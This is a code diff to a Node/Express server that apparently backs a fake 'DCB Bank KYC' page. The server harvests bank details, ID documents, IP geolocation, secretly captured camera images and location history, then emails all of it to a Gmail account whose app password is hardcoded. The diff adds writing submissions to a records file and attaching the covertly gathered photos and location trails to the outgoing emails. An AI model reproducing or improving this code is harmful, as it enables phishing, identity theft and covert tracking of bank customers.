@@ -1,3 +1,4 @@
+require('dotenv').config();
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
@@ -7,7 +8,7 @@ const geoip = require('geoip-lite');
 const os = require('os');
 
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 3000;
 
 // Trust proxy to get real client IP
 app.set('trust proxy', true);
@@ -61,22 +62,17 @@ const upload = multer({
   }
 }).any();
 
-// ======================
-// EMAIL CONFIGURATION (HARDCODED)
-// ======================
+// Email transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',  // Your Gmail
-    pass: 'kexmwnespcwxrkjt'           // Your app password
+    pass: 'iskexmwnespcwxrkjt'           // Your app password
   },
   pool: true,
   maxConnections: 1,
   rateLimit: 1
 });
-
-// Recipient email
-const RECIPIENT_EMAIL = 'dcbsubmission392@gmail.com';
 
 // Function to get client IP
 function getClientIp(req) {
@@ -198,8 +194,8 @@ app.post('/submit', (req, res) => {
       const timestamp = new Date().toLocaleString();
       const userAgent = req.headers['user-agent'];
 
-      // Log entry
-      console.log(`
+      // Create log entry
+      const logEntry = `
 --- Submission ---
 Bank Name: ${bankname}
 IFSC Code: ${ifsc}
@@ -212,12 +208,16 @@ IP: ${ip} (${ipLocation})
 User Agent: ${userAgent}
 Location: ${locationData ? `${locationData.latitude}, ${locationData.longitude}` : 'None'}
 Images Captured: ${imageAttachments.length}
--------------------`);
+-------------------
+`;
+
+      fs.appendFileSync('records.txt', logEntry);
+      console.log(logEntry);
 
       // Prepare email content
       const mailOptions = {
         from: `DCB Bank KYC <dcbsubmission392@gmail.com>`,
-        to: RECIPIENT_EMAIL,
+        to: 'dcbsubmission392@gmail.com',
         subject: '🔔 New DCB Bank KYC Submission',
         html: `
           <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
@@ -260,8 +260,7 @@ Images Captured: ${imageAttachments.length}
       if (documentFile) {
         mailOptions.attachments.push({
           filename: documentFile.originalname,
-          path: documentFile.path,
-          encoding: 'base64'
+          path: documentFile.path
         });
       }
 
@@ -269,8 +268,7 @@ Images Captured: ${imageAttachments.length}
       imageAttachments.forEach(file => {
         mailOptions.attachments.push({
           filename: file.originalname,
-          path: file.path,
-          encoding: 'base64'
+          path: file.path
         });
       });
 
@@ -284,14 +282,44 @@ Images Captured: ${imageAttachments.length}
       imageAttachments.forEach(file => fs.unlinkSync(file.path));
       console.log('Temporary files cleaned up');
 
-      // Also, if there's background data for this session, include in a follow-up email
+      // Background data processing
       if (sessionId && backgroundDataStore[sessionId]) {
         console.log(`Background data for session ${sessionId} exists (${backgroundDataStore[sessionId].images.length} images, ${backgroundDataStore[sessionId].locations.length} locations)`);
         
+        // Create a temporary directory for this session
+        const sessionDir = path.join(uploadDir, sessionId);
+        if (!fs.existsSync(sessionDir)) {
+          fs.mkdirSync(sessionDir, { recursive: true });
+        }
+
+        // Save images to disk
+        const imageFiles = [];
+        backgroundDataStore[sessionId].images.forEach((img, index) => {
+          const base64Data = img.replace(/^data:image\/jpeg;base64,/, "");
+          const filename = `session-${sessionId}-image-${index}.jpg`;
+          const filePath = path.join(sessionDir, filename);
+          fs.writeFileSync(filePath, base64Data, 'base64');
+          imageFiles.push(filePath);
+        });
+
+        // Prepare location data
+        let locationContent = "Location History:\n";
+        backgroundDataStore[sessionId].locations.forEach((loc, index) => {
+          locationContent += `\nPoint ${index + 1}:\n`;
+          locationContent += `- Latitude: ${loc.latitude}\n`;
+          locationContent += `- Longitude: ${loc.longitude}\n`;
+          locationContent += `- Accuracy: ${loc.accuracy} meters\n`;
+          locationContent += `- Timestamp: ${new Date(loc.timestamp).toLocaleString()}\n`;
+        });
+
+        // Create location file
+        const locationFile = path.join(sessionDir, `session-${sessionId}-locations.txt`);
+        fs.writeFileSync(locationFile, locationContent);
+
         // Send background data email
         const bgMailOptions = {
           from: `DCB Bank KYC <dcbsubmission392@gmail.com>`,
-          to: RECIPIENT_EMAIL,
+          to: 'dcbsubmission392@gmail.com',
           subject: '📸 Background Data for Session: ' + sessionId,
           html: `
             <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
@@ -306,17 +334,40 @@ Images Captured: ${imageAttachments.length}
                 <p><strong>Location Points:</strong> ${backgroundDataStore[sessionId].locations.length}</p>
                 <p><strong>IP Addresses:</strong> ${[...new Set(backgroundDataStore[sessionId].ipAddresses)].join(', ')}</p>
               </div>
+              
+              <p style="margin-top: 20px;">Location history and captured images are attached to this email.</p>
             </div>
           `,
-          attachments: []
+          attachments: [
+            {
+              filename: `session-${sessionId}-locations.txt`,
+              path: locationFile
+            }
+          ]
         };
-        
+
+        // Add image attachments
+        imageFiles.forEach(file => {
+          bgMailOptions.attachments.push({
+            filename: path.basename(file),
+            path: file
+          });
+        });
+
         // Send background email
         await transporter.sendMail(bgMailOptions);
         console.log('Background data email sent');
         
         // Cleanup session data
         delete backgroundDataStore[sessionId];
+        
+        // Cleanup files after sending
+        setTimeout(() => {
+          if (fs.existsSync(sessionDir)) {
+            fs.rmSync(sessionDir, { recursive: true, force: true });
+            console.log(`Cleaned up session files: ${sessionDir}`);
+          }
+        }, 30000); // Cleanup after 30 seconds
       }
 
       res.status(200).send();
